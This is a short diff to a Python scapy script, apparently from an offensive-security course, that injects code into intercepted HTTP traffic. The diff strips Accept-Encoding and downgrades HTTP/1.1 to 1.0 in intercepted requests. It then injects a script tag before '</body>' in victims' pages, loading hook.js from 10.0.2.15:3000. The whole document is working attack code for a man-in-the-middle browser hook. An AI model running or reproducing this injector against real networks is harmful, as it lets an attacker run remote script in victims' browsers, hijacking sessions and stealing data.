@@ -19,11 +19,12 @@ def process_packet(packet):
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] REQUEST:")
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)    # question mark means first one
+            load = load.replace("HTTP/1.1", "HTTP/1.0")
 
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] RESPONSE:")
             # print(scapy_packet.show())
-            injection_code = "<script>alert('test11111');</script>"
+            injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
             load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)     # don't include that in the re
             if content_length_search and "text/html" in load:
